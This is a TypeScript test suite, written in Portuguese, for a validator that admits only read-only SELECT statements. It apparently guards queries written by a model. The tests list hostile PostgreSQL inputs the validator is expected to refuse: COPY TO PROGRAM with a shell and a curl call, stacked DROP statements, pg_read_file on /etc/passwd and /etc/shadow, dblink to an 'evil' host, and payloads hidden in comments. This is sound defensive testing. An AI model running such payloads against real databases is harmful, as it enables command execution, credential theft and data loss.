import {
  schemasBemFormados,
  TAMANHO_MAXIMO_SQL,
  tokenizar,
  validarConsulta,
  type VeredictoConsulta,
} from './sql-seguro';

const SCHEMAS = ['public', 'app'];

function validar(sql: unknown, teto = 100): VeredictoConsulta {
  return validarConsulta(sql, { teto, schemas: SCHEMAS });
}

function motivo(sql: unknown): string {
  const veredicto = validar(sql);

  expect(veredicto.ok).toBe(false);

  return veredicto.ok ? '' : veredicto.motivo;
}

function sqlAprovado(sql: string, teto = 100): string {
  const veredicto = validar(sql, teto);

  if (!veredicto.ok) {
    throw new Error(`esperava aprovação, veio recusa: ${veredicto.motivo}`);
  }

  return veredicto.sql;
}

describe('validarConsulta — só um SELECT passa', () => {
  describe('escrita crua', () => {
    const escritas = [
      'UPDATE usuario SET ativo = false',
      'INSERT INTO usuario (nome) VALUES (1)',
      'DELETE FROM usuario',
      'DROP TABLE usuario',
      'TRUNCATE usuario',
      'ALTER TABLE usuario ADD COLUMN x int',
      'CREATE TABLE x (id int)',
      'GRANT ALL ON usuario TO publico',
      'REVOKE ALL ON usuario FROM publico',
      'COPY usuario TO PROGRAM \'sh -c "curl evil"\'',
      "COPY (SELECT 1) TO PROGRAM 'sh'",
      'DO $$ BEGIN PERFORM 1; END $$',
      'SET statement_timeout = 0',
      'RESET ALL',
      'BEGIN',
      'VACUUM FULL',
      'CALL rotina_qualquer()',
      'MERGE INTO alvo USING fonte ON true',
      'EXPLAIN SELECT 1',
      'VALUES (1)',
      'TABLE usuario',
    ];

    it.each(escritas)('recusa %s', (sql) => {
      expect(validar(sql).ok).toBe(false);
    });
  });

  describe('múltiplas instruções', () => {
    it('recusa SELECT 1; DROP TABLE x', () => {
      expect(motivo('SELECT 1; DROP TABLE x')).toContain('ponto e vírgula');
    });

    it('recusa qualquer ; que não seja o final', () => {
      expect(validar('SELECT 1;;').ok).toBe(false);
      expect(validar('SELECT 1 ; SELECT 2').ok).toBe(false);
      expect(validar("SELECT 1; COPY x TO PROGRAM 'sh'").ok).toBe(false);
    });

    it('aceita um único ponto e vírgula no fim', () => {
      expect(sqlAprovado('SELECT 1;')).toBe('SELECT 1 LIMIT 100');
    });

    it('não confunde ; dentro de literal com fim de instrução', () => {
      expect(sqlAprovado("SELECT * FROM app.log WHERE msg = 'a;b'")).toContain(
        "'a;b'",
      );
    });
  });

  describe('escrita escondida em CTE', () => {
    const ctes = [
      'WITH t AS (DELETE FROM x RETURNING *) SELECT * FROM t',
      'WITH t AS (INSERT INTO x VALUES (1) RETURNING *) SELECT * FROM t',
      'WITH t AS (UPDATE x SET a = 1 RETURNING *) SELECT * FROM t',
      'WITH t AS (MERGE INTO x USING y ON true) SELECT 1',
      'with morto as ( delete from trecho returning * ) select * from morto',
    ];

    it.each(ctes)('recusa %s', (sql) => {
      expect(validar(sql).ok).toBe(false);
    });

    it('aceita CTE de leitura', () => {
      expect(
        validar('WITH t AS (SELECT id FROM public.usuario) SELECT * FROM t').ok,
      ).toBe(true);
    });
  });

  describe('funções perigosas', () => {
    const perigosas = [
      "SELECT pg_read_file('/etc/passwd')",
      "SELECT pg_read_binary_file('/etc/shadow')",
      "SELECT pg_ls_dir('/')",
      'SELECT pg_sleep(60)',
      'SELECT pg_terminate_backend(1)',
      "SELECT * FROM dblink('host=evil', 'select 1') AS t(x text)",
      "SELECT lo_import('/etc/passwd')",
      "SELECT lo_export(1, '/tmp/saida')",
      "SELECT current_setting('is_superuser')",
      "SELECT set_config('search_path', 'pg_catalog', false)",
      "SELECT query_to_xml('select 1', true, true, '')",
      "SELECT xpath('/x', '<x/>')",
      'SELECT * FROM pg_shadow',
      'SELECT * FROM pg_catalog.pg_authid',
      'SELECT usename FROM pg_user',
      'SELECT version()',
      "SELECT convert_from(pg_read_file('/etc/passwd'), 'utf8')",
      "SELECT format('%s', 1)",
      "SELECT public.pg_read_file('/etc/passwd')",
    ];

    it.each(perigosas)('recusa %s', (sql) => {
      expect(validar(sql).ok).toBe(false);
    });

    it('recusa função desconhecida mesmo com nome inocente', () => {
      expect(motivo('SELECT minha_funcao_custom(1)')).toContain('allowlist');
    });

    it('aceita a allowlist de agregação e texto', () => {
      expect(
        validar(
          "SELECT count(*), upper(nome), coalesce(apelido, '-') FROM public.usuario GROUP BY nome, apelido",
        ).ok,
      ).toBe(true);
    });
  });

  describe('comentário escondendo payload', () => {
    it('recusa -- seguido de payload em nova linha', () => {
      expect(motivo('SELECT 1 --\nDROP TABLE x')).toContain('comentário');
    });

    it('recusa /* */ no meio da consulta', () => {
      expect(motivo('SELECT/**/1')).toContain('comentário');
      expect(
        motivo('WITH t AS/**/(DELETE FROM x RETURNING *) SELECT * FROM t'),
      ).toContain('comentário');
    });

    it('recusa comentário no fim, mesmo sem payload', () => {
      expect(validar('SELECT 1 -- só um comentário').ok).toBe(false);
    });

    it('não confunde -- dentro de literal com comentário', () => {
      expect(validar("SELECT * FROM app.log WHERE msg = 'a--b'").ok).toBe(true);
    });
  });

  describe('caixa mista e caracteres fora do ASCII', () => {
    it('aceita SeLeCt', () => {
      expect(sqlAprovado('SeLeCt 1')).toBe('SeLeCt 1 LIMIT 100');
    });

    it('recusa payload em caixa mista', () => {
      expect(validar('SeLeCt Pg_SlEeP(60)').ok).toBe(false);
      expect(validar('WiTh t As (DeLeTe FrOm x) SeLeCt 1').ok).toBe(false);
      expect(validar('sElEcT 1; dRoP TABLE x').ok).toBe(false);
    });

    it('recusa caractere fora do ASCII fora de literal', () => {
      expect(validar('ＳＥＬＥＣＴ 1').ok).toBe(false);
      expect(validar('SELECT 1 ; SELECT 2').ok).toBe(false);
    });

    it('aceita acento dentro de literal', () => {
      expect(
        validar("SELECT * FROM public.usuario WHERE nome = 'José Antônio'").ok,
      ).toBe(true);
    });

    it('recusa literal com prefixo de escape', () => {
      expect(motivo("SELECT E'\\x41'")).toContain('prefixo');
      expect(validar("SELECT U&'\\0044rop'").ok).toBe(false);
    });

    it('recusa cifrão, barra invertida, crase e chaves', () => {
      for (const sql of [
        'SELECT $1',
        'SELECT $$x$$',
        'SELECT 1 \\g',
        'SELECT `id` FROM t',
        'SELECT 1 {}',
        'SELECT 1 ~ 2',
        'SELECT 1 # 2',
      ]) {
        expect(validar(sql).ok).toBe(false);
      }
    });
  });

  describe('schemas', () => {
    it('aceita schema liberado', () => {
      expect(validar('SELECT * FROM public.usuario').ok).toBe(true);
      expect(validar('SELECT * FROM app.evento').ok).toBe(true);
    });

    it('recusa schema fora da lista', () => {
      expect(motivo('SELECT * FROM outro.usuario')).toContain(
        'não está liberado',
      );
      expect(validar('SELECT * FROM information_schema.tables').ok).toBe(false);
      expect(validar('SELECT * FROM public.a JOIN outro.b ON true').ok).toBe(
        false,
      );
    });

    it('recusa schema entre aspas quando não liberado', () => {
      expect(validar('SELECT * FROM "outro"."usuario"').ok).toBe(false);
      expect(validar('SELECT * FROM "public"."usuario"').ok).toBe(true);
    });

    it('recusa qualificação de mais de dois níveis', () => {
      expect(motivo('SELECT * FROM banco.public.usuario')).toContain(
        'mais de um nível',
      );
    });

    it('recusa alvo sem schema declarado', () => {
      const veredicto = validarConsulta('SELECT 1', { teto: 10, schemas: [] });

      expect(veredicto.ok).toBe(false);
    });

    it('recusa schema cadastrado fora do formato', () => {
      const veredicto = validarConsulta('SELECT 1', {
        teto: 10,
        schemas: ['public; drop schema public'],
      });

      expect(veredicto.ok).toBe(false);
    });
  });

  describe('LIMIT imposto', () => {
    it('acrescenta LIMIT quando não existe', () => {
      expect(sqlAprovado('SELECT * FROM public.usuario')).toBe(
        'SELECT * FROM public.usuario LIMIT 100',
      );
    });

    it('reduz LIMIT maior que o teto', () => {
      expect(sqlAprovado('SELECT * FROM public.usuario LIMIT 100000')).toBe(
        'SELECT * FROM public.usuario LIMIT 100',
      );
    });

    it('preserva LIMIT menor que o teto', () => {
      const veredicto = validar('SELECT * FROM public.usuario LIMIT 5');

      expect(veredicto.ok && veredicto.limite).toBe(5);
      expect(veredicto.ok && veredicto.limiteImposto).toBe(false);
    });

    it('ignora LIMIT de subconsulta e impõe o de fora', () => {
      expect(sqlAprovado('SELECT * FROM (SELECT 1 LIMIT 100000) x')).toBe(
        'SELECT * FROM (SELECT 1 LIMIT 100000) x LIMIT 100',
      );
    });

    it('recusa LIMIT que não é inteiro literal', () => {
      expect(motivo('SELECT 1 LIMIT ALL')).toContain('número inteiro');
      expect(validar('SELECT 1 LIMIT (SELECT 9)').ok).toBe(false);
    });

    it('recusa FETCH FIRST, que escaparia do LIMIT', () => {
      expect(
        validar('SELECT * FROM public.usuario FETCH FIRST 100000 ROWS ONLY').ok,
      ).toBe(false);
    });

    it('respeita o teto pedido', () => {
      expect(sqlAprovado('SELECT 1', 7)).toBe('SELECT 1 LIMIT 7');
      expect(sqlAprovado('SELECT 1 LIMIT 50', 7)).toBe('SELECT 1 LIMIT 7');
    });
  });

  describe('coluna mascarada nomeada na consulta', () => {
    function comMascara(sql: string): VeredictoConsulta {
      return validarConsulta(sql, {
        teto: 100,
        schemas: SCHEMAS,
        colunasMascaradas: ['senha'],
      });
    }

    it('recusa quando o modelo tenta apelidar a coluna mascarada', () => {
      expect(comMascara('SELECT senha AS x FROM public.usuario').ok).toBe(
        false,
      );
      expect(comMascara('SELECT SENHA FROM public.usuario').ok).toBe(false);
      expect(comMascara('SELECT "senha" FROM public.usuario').ok).toBe(false);
      expect(comMascara('SELECT md5(senha) FROM public.usuario').ok).toBe(
        false,
      );
      expect(
        comMascara("SELECT id FROM public.usuario WHERE senha = 'a'").ok,
      ).toBe(false);
      expect(
        comMascara('SELECT * FROM (SELECT senha AS x FROM public.usuario) q')
          .ok,
      ).toBe(false);
    });

    it('aceita a mesma consulta sem citar a coluna mascarada', () => {
      expect(comMascara('SELECT * FROM public.usuario').ok).toBe(true);
      expect(comMascara('SELECT id, nome FROM public.usuario').ok).toBe(true);
    });
  });

  describe('entrada malformada', () => {
    it('recusa o que não é texto', () => {
      for (const bruto of [
        undefined,
        null,
        42,
        {},
        ['SELECT 1'],
        true,
        '',
        '  ',
      ]) {
        expect(validar(bruto).ok).toBe(false);
      }
    });

    it('recusa consulta gigante', () => {
      const gigante = `SELECT ${'a'.repeat(TAMANHO_MAXIMO_SQL)}`;

      expect(motivo(gigante)).toContain('caracteres');
    });

    it('recusa literal sem fechamento', () => {
      expect(motivo("SELECT * FROM t WHERE a = 'aberto")).toContain(
        'sem aspa de fechamento',
      );
    });

    it('recusa identificador citado sem fechamento', () => {
      expect(motivo('SELECT "aberto FROM t')).toContain('sem fechamento');
    });
  });
});

describe('tokenizar', () => {
  it('separa palavra, número, literal e símbolo', () => {
    const resultado = tokenizar("SELECT a.b, 12 FROM t WHERE x = 'y'");

    expect(resultado.ok).toBe(true);
    expect(resultado.ok && resultado.tokens.map((token) => token.tipo)).toEqual(
      [
        'palavra',
        'palavra',
        'simbolo',
        'palavra',
        'simbolo',
        'numero',
        'palavra',
        'palavra',
        'palavra',
        'palavra',
        'simbolo',
        'texto',
      ],
    );
  });

  it('trata aspas duplicadas dentro de literal', () => {
    const resultado = tokenizar("SELECT 'a''b'");

    expect(resultado.ok && resultado.tokens[1].valor).toBe("'a''b'");
  });
});

describe('schemasBemFormados', () => {
  it('recusa lista vazia', () => {
    expect(schemasBemFormados([]).ok).toBe(false);
    expect(schemasBemFormados(['  ']).ok).toBe(false);
  });

  it('recusa nome com caractere fora do formato', () => {
    for (const schema of [
      'public; drop',
      'a"b',
      'a b',
      '1public',
      'público',
      'pg_$x',
    ]) {
      expect(schemasBemFormados([schema]).ok).toBe(false);
    }
  });

  it('aceita e apara nomes válidos', () => {
    const resultado = schemasBemFormados([' public ', 'app_v2']);

    expect(resultado.ok && resultado.schemas).toEqual(['public', 'app_v2']);
  });
});
